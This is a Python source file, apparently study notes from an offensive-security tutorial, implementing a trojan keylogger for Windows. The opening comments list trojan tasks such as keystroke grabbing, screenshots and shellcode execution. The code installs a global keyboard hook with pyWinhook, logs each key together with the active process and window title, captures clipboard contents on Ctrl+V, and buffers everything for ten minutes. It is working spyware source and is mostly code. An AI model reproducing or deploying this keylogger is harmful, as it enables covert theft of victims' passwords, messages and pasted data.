# 𝗧𝗿𝗼𝗷𝗮𝗻 𝗰𝗼𝗺𝗺𝗼𝗻 𝘁𝗮𝘀𝗸𝘀: 
#   - grab keystrokes
#   - take screenshots 
#   - execute shellcode toprovide interactive sessions like CANVAS OR Metasploit
# 𝗞𝗲𝘆𝗹𝗼𝗴𝗴𝗶𝗻𝗴:
#   - Have a programm running in the back to record keystrokes
#   -  Good with 𝘗𝘺𝘞𝘪𝘯𝘏𝘰𝘰𝘬 (Windows oriented ovi)
#   - PyWinHook comes from the og 𝘗𝘺𝘏𝘰𝘰𝘬 and exploits 𝘚𝘦𝘵𝘞𝘪𝘯𝘥𝘰𝘸𝘴𝘏𝘰𝘰𝘬𝘌𝘹 
#   - SetWindowsHookEx allows to install user-defined functions to be called for certain Windows events
#   - The trojan would set a process againts keyboard events, to record the keystrokes
#   - It also records what processes the keys were ussed on

from ctypes import byref, create_string_buffer, c_ulong, windll
from io import StringIO

import os
import pythoncom
import pyWinhook as PyHook
import sys
import time
import win32clipboard

TIMEOUT = 60*10

class Keylogger:
    def __init__(self):
        self.current_window = None
    
    def get_current_process(self):
        # 𝘨𝘦𝘵_𝘤𝘶𝘳𝘳𝘦𝘯𝘵_𝘱𝘳𝘰𝘤𝘦𝘴𝘴(𝘴𝘦𝘭𝘧) captures active window and associated proc Id 
        hwnd = windll.user32.GetForegroundWindow() # Returns active win handdle
        pid = c_ulong(0)
        windll.user32.GetWindowThreadProcessId(hwnd, byref(pid)) # Get proc Id
        process_id = f'{pid.value}'
        
        executable = create_string_buffer(512)
        h_process = windll.kernel32.OpenProcess(0x400|0x10, False, pid) 
        # Open process
        windll.psapi.GetModuleBaseNameA(
            h_process, None, byref(executable), 512
        ) # Get exec name
        
        window_title = create_string_buffer(512)
        windll.user32.GetWindowTextA(hwnd, byref(window_title),512)
        # Get name from win title bar
        try:
            self.current_window = window_title.value.decode()
        except UnicodeDecodeError as e:
            print(f'{e}: Window name unknown')
        
        print('\n', process_id, executable.value.decode(), self.current_window)
        # Output all info
        
        windll.kernel32.CloseHandle(hwnd)
        windll.kernel32.CloseHandle(h_process)

    def mykeystroke(self, event):
        # Captures keystrokes
        if event.WindowName != self.current_window:
            # Check if uss has changed windows
            self.get_current_process()
        if 32<event.Ascii<127: # If ascii, print out
            print(chr(event.Ascii), end='')
        else: # Else grab key name
            if event.Key == 'V': # If paste (CRTL+V), dump clipboard content
                win32clipboard.OpenClipboard()
                value = win32clipboard.GetClipboardData()
                win32clipboard.CloseClipboard()
                print(f'[PASTE] - {value}')
            else:
                print(f'{event.Key}')
        return True # Callback returns true to allow next hook

def run():
    save_stdout = sys.stdout
    sys.stdout = StringIO()
        
    kl = Keylogger() # Keylogger obj 
    hm = PyHook.HookManager() # Def PyHook HookManager
    hm.KeyDown = kl.mykeystroke # Bind 𝘒𝘦𝘺𝘋𝘰𝘸𝘯 𝘦𝘷𝘦𝘯𝘵 to 𝘮𝘺𝘬𝘦𝘺𝘴𝘵𝘳𝘰𝘬𝘦()
    hm.HookKeyboard() # Hook al keypresses 
   
    while time.thread_time()<TIMEOUT: 
        # Continue exec until 𝘛𝘐𝘔𝘌𝘖𝘜𝘛
        pythoncom.PumpWaitingMessages()
        
    log = sys.stdout.getvalue()
    sys.stdout = save_stdout
    return log

if __name__ == "__main__":
    print(run())
    print('done.')
    